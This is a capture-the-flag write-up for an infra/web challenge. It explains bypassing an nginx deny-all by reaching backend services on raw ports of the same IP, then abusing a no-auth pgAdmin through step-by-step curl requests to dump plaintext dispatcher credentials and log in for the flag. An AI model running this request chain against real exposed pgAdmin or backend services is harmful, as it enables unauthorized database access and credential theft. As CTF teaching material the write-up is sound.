# Сотолёт — write-up

**Flag:** `avito{5ot0lE7_que3N_bEar1NG}`
**Class:** Infra / Web (Easy, 1000 pts) — reverse-proxy ACL bypass via raw backend ports → no-auth
pgAdmin → DB credential dump → dispatcher login → the Queen's route sheet.

**The core idea in one sentence:** the two "closed" admin tools are blocked by nginx's `deny all` on
port 443, but their backend app servers are *also* listening directly on raw TCP ports on the very
same public IP — so the whole ACL is one port-scan away from being irrelevant.

---

## 1. The challenge

"Сотолёт" is the operational portal of swarm **«Золотая Сота»**, showing a PUBLIC flights radar.
The status panel announces `Режим: PUBLIC — закрытые маршруты не выводятся` ("closed routes are not
shown"). Our objective: reach the **senior dispatcher** panel and steal the **Queen's route sheet**
(Маршрут Королевы), which the public UI deliberately hides.

---

## 2. Recon — the host map

`sotolet.ru`'s HTML links two sibling subdomains. `dig` shows all three resolve to the **same public
IP `84.201.131.80`** — the first hint that "different subdomain" is only a front-door distinction,
not a network one:

| Host | Role | Front door (nginx :443) |
|---|---|---|
| `sotolet.ru` | public flights radar (Flask SSR + vanilla-JS SVG map) | `200` |
| `sotobaza.sotolet.ru` | the Postgres **pgAdmin 4** UI | **`403`** (nginx `deny all`) |
| `sotokabina.sotolet.ru` | the **Senior Dispatcher** panel (Flask) | **`403`** (nginx `deny all`) |

The two admin vhosts return a blanket `403` for *every* path. We first tried the usual proxy-ACL
bypasses — Host/SNI mismatch, `X-Forwarded-For` / `X-Real-IP` spoofing — and **none worked**: the
deny is a plain per-vhost `deny all;`, not an IP allow-list we can spoof our way past. That negative
result is what pushed us off the front door and toward the origin IP itself.

**Port-scanning `84.201.131.80`** found two extra HTTP services living *beside* nginx:

- `http://84.201.131.80:8080/` → `Server: gunicorn`, redirects to `/browser/`, sets a `pga4_session`
  cookie → this is **pgAdmin 4** (the backend of `sotobaza`).
- `http://84.201.131.80:8443/` → `Server: gunicorn`, redirects to `/login`, HTML title
  **"Вход в Сотокабину"** → the **dispatcher panel's** own login page (`login` = позывной/callsign,
  `password` = код смены/shift code). Note: plain HTTP despite the `:8443` name.

Both are reachable with no ACL, no cert — completely outside nginx's reverse-proxy layer.

---

## 3. Red herring — the client-side "IDOR"

Before the real path, the obvious-looking bug: `/static/js/tactical-map.js` calls `GET /api/map-data`
and then filters in the browser:

```js
visibleRoutes = routes.filter(r => !r.hidden);
```

This *screams* the classic "server sends hidden routes, client hides them" IDOR — just call the API
directly. But the raw response shows the server has **already masked** the Queen's route server-side
before it leaves the box:

```json
{ "id":"queen-route", "path":"XXX XXX ...", "distance":"закрыто", "status":"секретный", "hidden":true }
```

So `GET /api/map-data` leaks nothing. This is deliberate bait to burn time on the front door — the
masking is done correctly; the real weakness is in the infra, not the front-end.

---

## 4. The real vulnerability (Infra) — ACL bypass via raw backend ports

nginx gates both admin subdomains with a per-vhost `deny all` on 443, but the backend processes are
**also bound directly to raw TCP ports on the same public IP**, bypassing the reverse-proxy ACL
entirely:

- **pgAdmin 4** (gunicorn) → `http://84.201.131.80:8080/`
- **Сотокабина** dispatcher Flask app → `http://84.201.131.80:8443/`

The "closed" admin tools are therefore one `curl` away on their own ports. Everything below just
walks through that open door.

---

## 5. Exploit chain

### Step 1 — pgAdmin runs in desktop / no-auth mode

pgAdmin has two modes: multi-user server mode (login required) and single-user **desktop mode** (no
login at all). The per-session JS served *pre-auth* tells us which one this is:

```bash
curl -s http://84.201.131.80:8080/browser/js/utils.js | grep -E 'server_mode|csrf_token'
# pgAdmin['csrf_token']  = '<signed token>';
# pgAdmin['server_mode'] = 'False';      <-- desktop mode: NO login wall
```

`server_mode = 'False'` means there is no authentication gate; we only need to echo the
per-session CSRF token (handed out by that same public JS file) as `X-pgA-CSRFToken` alongside the
`pga4_session` cookie, and every pgAdmin API becomes usable.

### Step 2 — read the DB credentials out of the registered server

pgAdmin has the `Sotobaza` Postgres server **pre-registered** (`host: db`, `db: sotobaza`,
`user: bee`, `is_password_saved: false`). Postgres accepts an **empty password** for the low-priv
`bee` role (blank-password/trust auth from inside the container network), so we connect and query:

```bash
# connect as bee with a blank password
curl -s -X POST http://84.201.131.80:8080/browser/server/connect/1/1 \
  -H "X-pgA-CSRFToken: <token>" -H "Content-Type: application/json" \
  -c cj -b cj -d '{"password":""}'              # -> "Server connected."

# open a query transaction (dbname is REQUIRED in the body, or it 500s on KeyError: 'dbname')
curl -s -X POST http://84.201.131.80:8080/sqleditor/initialize/sqleditor/1/1/1/16384 \
  -H "X-pgA-CSRFToken: <token>" -H "Content-Type: application/json" \
  -c cj -b cj -d '{"dbname":"sotobaza"}'

# run SQL and poll for the result
curl -s -X POST http://84.201.131.80:8080/sqleditor/query_tool/start/1 \
  -H "X-pgA-CSRFToken: <token>" -H "Content-Type: application/json" \
  -c cj -b cj -d '{"sql":"SELECT * FROM dispatchers;"}'
curl -s http://84.201.131.80:8080/sqleditor/poll/1 -H "X-pgA-CSRFToken: <token>" -c cj -b cj
```

The `dispatchers` table hands us **application** login credentials in plaintext:

```
id | callsign      | role     | shift_code
1  | pchela-042    | operator | SMENA-042-NEKTAR
2  | pchela-117    | operator | SMENA-117-PYLCA
3  | starshina_sot | chief    | SMENA-STARSHINA-7741      <-- senior dispatcher
```

> Dead end worth noting: we also checked whether we could read the Queen's route straight from SQL
> as `bee`. We can't — the `tactical_routes` row for `queen-route` is masked **at the raw row
> level** too (`"XXX XXX..."`, `"закрыто"`). The unmasking only happens in the dispatcher app, so we
> must actually log into it. (The `chief` DB role is `rolsuper` but its real DB password is not
> blank; that's a decoy.)

### Step 3 — log into the dispatcher panel directly on its exposed port

```bash
curl -s -c kcj -X POST http://84.201.131.80:8443/login \
  --data-urlencode "login=starshina_sot" --data-urlencode "password=SMENA-STARSHINA-7741"
# -> 302 Found, Set-Cookie: session=...   (payload decodes to {"callsign":"starshina_sot"})
```

We now hold a senior-dispatcher session.

### Step 4 — pull the Queen's route sheet

```bash
curl -s -b kcj http://84.201.131.80:8443/api/admin-data
```

This is the endpoint the public UI never exposes. The `queen-route` entry is now **unmasked** and
carries the payload (the dispatcher `admin.js`'s `renderRouteCard()` has a special case for
`route.id === "queen-route"` that even renders `route.flag` into the "Траектория" field):

```json
{
  "id": "queen-route", "name": "Маршрут Королевы", "status": "FLAG",
  "distance": "avito{5ot0lE7_que3N_bEar1NG}",
  "flag": "avito{5ot0lE7_que3N_bEar1NG}", "hidden": true
}
```

---

## 6. Flag

```
avito{5ot0lE7_que3N_bEar1NG}
```

---

## 7. Takeaways

1. **A reverse-proxy ACL only protects what actually goes through the proxy.** Both "closed" admin
   tools listened on raw ports (`:8080`, `:8443`) on the same public IP, so nginx's `deny all` was
   trivially bypassed. Always port-scan the edge IP; don't trust the `:443` front door.
2. **pgAdmin in desktop mode = no auth.** The pre-auth JS (`utils.js`) advertises `server_mode` and
   hands out the CSRF token. A pre-registered server + a blank-password DB account turns that into a
   full SQL read.
3. **The client-side "hidden route" filtering was a deliberate decoy** — the server masked the data
   correctly, pushing the real path to infra misconfiguration, not front-end IDOR. When the naive
   IDOR resists, look at what's *behind* the app, not just the app.

---

**Artifacts:** `NOTES.md` (full host map, JS-derived APIs, exact repro requests), the raw fetched
evidence (`map-data.json`, `*_root.html`, `*_headers.txt`, `tactical-map.js`), `FLAG.txt`.
